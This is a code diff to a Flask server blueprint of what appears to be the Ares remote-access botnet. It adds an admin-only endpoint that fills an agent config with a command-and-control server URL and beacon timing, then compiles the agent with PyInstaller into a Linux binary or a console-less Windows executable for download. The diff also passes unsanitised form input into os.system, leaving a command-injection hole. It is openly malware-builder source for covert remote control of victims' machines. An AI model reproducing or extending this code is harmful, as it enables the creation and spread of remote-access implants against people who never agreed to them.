@@ -2,12 +2,15 @@ import json
 import base64
 import os
 from datetime import datetime
+import tempfile
+import shutil
 
 from flask import Blueprint
 from flask import request
 from flask import abort
 from flask import current_app
 from flask import url_for
+from flask import send_file
 from werkzeug.utils import secure_filename
 import pygeoip
 
@@ -50,6 +53,7 @@ def get_command(agent_id):
     else:
         agent = Agent.query.get(agent_id)
         if not agent:
+            print "Creating agent"
             agent = Agent()
             agent.set_id(agent_id)
             agent.rename(agent_id)
@@ -96,7 +100,7 @@ def report_command(agent_id):
                 relative_path = agent_id
                 absolute_path = os.path.join(current_app.config['UPLOAD_FOLDER'], relative_path)
                 filename = secure_filename(output_file.filename)
-                if not os.path.exists(os.path.dirname(absolute_path)):
+                if not os.path.exists(absolute_path):
                     os.makedirs(absolute_path)
                 while os.path.exists(os.path.join(absolute_path, filename)):
                     filename = '_' + filename
@@ -108,3 +112,41 @@ def report_command(agent_id):
     else:
         abort(404)
     return ''
+
+
+def _build_agent(agent_id, platform, server_url, hello_interval, idle_time):
+    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
+    if os.path.exists(working_dir):
+        shutil.rmtree(working_dir)
+    shutil.copytree('../agent', working_dir)
+    template_conf = open('../agent/template_config.py', 'r').read()
+    template_conf = template_conf.replace('__UID__', agent_id)
+    template_conf = template_conf.replace('__SERVER__', server_url)
+    template_conf = template_conf.replace('__HELLO_INTERVAL__', str(hello_interval))
+    template_conf = template_conf.replace('__IDLE_TIME__', str(idle_time))
+    with open(os.path.join(working_dir, 'config.py'), 'w') as f:
+        f.write(template_conf)
+    if platform == 'Linux':
+        cwd = os.getcwd()
+        os.chdir(working_dir)
+        shutil.move('agent.py', agent_id + '.py')
+        os.system('pyinstaller --workpath ' + os.path.join(working_dir, 'build') + ' --distpath ' + os.path.join(working_dir, 'dist') + ' --onefile ' + agent_id + '.py')
+        agent_file = os.path.join(working_dir, 'dist', agent_id)
+        os.chdir(cwd)
+        return agent_file
+    elif platform == 'Windows':
+        cwd = os.getcwd()
+        os.chdir(working_dir)
+        shutil.move('agent.py', agent_id + '.py')
+        os.system('wine pyinstaller --noconsole --onefile ' + agent_id + '.py')
+        agent_file = os.path.join(working_dir, 'dist', agent_id + '.exe')
+        os.chdir(cwd)
+        return agent_file
+    return ''
+
+
+@api.route('/build', methods=['POST'])
+@require_admin
+def build_agent():
+    agent = _build_agent(request.form['agent_id'], request.form['agent_platform'], request.form['agent_server'], 10, 20)
+    return send_file(agent, as_attachment=True)
